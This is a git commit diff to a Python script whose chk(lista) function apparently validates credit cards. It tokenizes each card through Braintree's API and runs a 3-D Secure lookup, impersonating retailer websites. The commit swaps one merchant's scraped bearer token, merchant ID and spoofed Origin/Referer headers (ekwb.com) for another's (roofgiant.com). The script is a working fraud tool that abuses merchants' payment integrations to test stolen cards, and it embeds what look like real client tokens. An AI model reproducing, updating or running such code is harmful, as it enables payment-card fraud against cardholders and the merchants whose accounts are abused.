6b840c149f316b534514d29dea5137e71af7ddcb
Ammar Abdulltaif bardan <129907285+vv7jttniffj@users.noreply.github.com>
2023-07-18 12:28:36 +0300

    Update api.py

--- api.py
+++ api.py
@@ -41,7 +41,7 @@ def chk(lista):
             "clientSdkMetadata": {
                 "source": "client",
                 "integration": "custom",
-                "sessionId": "95bd43b5-8dd8-4708-95aa-770d3a9ea1be"
+                "sessionId": "12345b4b-6dee-49db-9530-cedfba586bb9"
             },
             "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
             "variables": {
@@ -63,7 +63,7 @@ def chk(lista):
             "operationName": "TokenizeCreditCard"
         }
         headers = {
-            'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2ODY3MjI0ODIsImp0aSI6IjliYzhjYzM4LWEzMDUtNGNmNi05YzlkLWE2NjdlNTg4NGM2ZiIsInN1YiI6InJoMmczNHh0Z3J6cG54YmgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InJoMmczNHh0Z3J6cG54YmgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImVrd2JVU0QifX0.rRzfHSB-goJCOuOnkFcqDoOY8OiHYuWm27u-BK2Fyp1Dt4n3WuoC9DT5yfpcf08ccpmi6aPLnrwrBOjywIr83g',
+            'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2ODk3MTU1ODcsImp0aSI6ImNiYzk3ZGZiLTFjMDItNDE1ZS04ZjE0LTUxYTQ1N2NlY2U1MiIsInN1YiI6IjRwdHhqbTk2cmpkY3Q5cWIiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjRwdHhqbTk2cmpkY3Q5cWIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.Njv9O53dbAm-Iw-YTI4L_2-QxjyMIeXQf1oOSvhWs7_ZjZH3zLwPIlZRulAOF_ojHaAXbxSE5Ebwouprv_FH7g',
             'braintree-version': '2018-05-10',
             'Content-Type': 'application/json',
             'Origin': 'https://assets.braintreegateway.com',
@@ -77,12 +77,12 @@ def chk(lista):
         response_dict = req1.json()
         if response_dict['data']['tokenizeCreditCard']['token']:
             token = response_dict['data']['tokenizeCreditCard']['token']
-            url2 = f'https://api.braintreegateway.com/merchants/rh2g34xtgrzpnxbh/client_api/v1/payment_methods/{token}/three_d_secure/lookup'
-            data2 = '''{"amount":"26.71","additionalInfo":{"shippingGivenName":"","shippingSurname":"","shippingPhone":"","billingLine1":"newyork st","billingLine2":"","billingCity":"newyorks city","billingState":"","billingPostalCode":"10080","billingCountryCode":"US","billingPhoneNumber":"9098184561","billingGivenName":"john","billingSurname":"smith","shippingLine1":"","shippingLine2":"","shippingCity":"","shippingState":"","shippingPostalCode":"","shippingCountryCode":"US"},"dfReferenceId":"0_8b867996-04c5-497a-aff3-294748e4a6ea","clientMetadata":{"sdkVersion":"web/3.48.0","requestedThreeDSecureVersion":"2","cardinalDeviceDataCollectionTimeElapsed":1852},"authorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2ODY3MjI0ODIsImp0aSI6IjliYzhjYzM4LWEzMDUtNGNmNi05YzlkLWE2NjdlNTg4NGM2ZiIsInN1YiI6InJoMmczNHh0Z3J6cG54YmgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InJoMmczNHh0Z3J6cG54YmgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImVrd2JVU0QifX0.rRzfHSB-goJCOuOnkFcqDoOY8OiHYuWm27u-BK2Fyp1Dt4n3WuoC9DT5yfpcf08ccpmi6aPLnrwrBOjywIr83g","braintreeLibraryVersion":"braintree/web/3.48.0","_meta":{"merchantAppId":"www.ekwb.com","platform":"web","sdkVersion":"3.48.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"95bd43b5-8dd8-4708-95aa-770d3a9ea1be"}}'''
+            url2 = f'https://api.braintreegateway.com/merchants/4ptxjm96rjdct9qb/client_api/v1/payment_methods/{token}/three_d_secure/lookup'
+            data2 = '''{"amount":20.97,"additionalInfo":{"billingLine1":"i don't know ","billingCity":"also i don't kn","billingState":"","billingPostalCode":"10080","billingCountryCode":"GB","billingPhoneNumber":"","billingGivenName":"Ammar","billingSurname":"Abd"},"dfReferenceId":"0_1375f58c-ba0a-4482-ae45-c915e0349213","clientMetadata":{"sdkVersion":"web/3.85.2","requestedThreeDSecureVersion":"2","cardinalDeviceDataCollectionTimeElapsed":778},"authorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2ODk3MTU1ODcsImp0aSI6ImNiYzk3ZGZiLTFjMDItNDE1ZS04ZjE0LTUxYTQ1N2NlY2U1MiIsInN1YiI6IjRwdHhqbTk2cmpkY3Q5cWIiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjRwdHhqbTk2cmpkY3Q5cWIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.Njv9O53dbAm-Iw-YTI4L_2-QxjyMIeXQf1oOSvhWs7_ZjZH3zLwPIlZRulAOF_ojHaAXbxSE5Ebwouprv_FH7g","braintreeLibraryVersion":"braintree/web/3.85.2","_meta":{"merchantAppId":"www.roofgiant.com","platform":"web","sdkVersion":"3.85.2","source":"client","integration":"custom","integrationType":"custom","sessionId":"12345b4b-6dee-49db-9530-cedfba586bb9"}}'''
             headers2 = {
                 'Content-Type': 'application/json',
-                "Origin": "https://www.ekwb.com",
-                "Referer": "https://www.ekwb.com/",  # This is the site for api
+                "Origin": "https://www.roofgiant.com",
+                "Referer": "https://www.roofgiant.com/",  # This is the site for api
                 "Sec-Ch-Ua": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
                 "Sec-Ch-Ua-Mobile": "?0",
                 "Sec-Ch-Ua-Platform": '"Windows"',
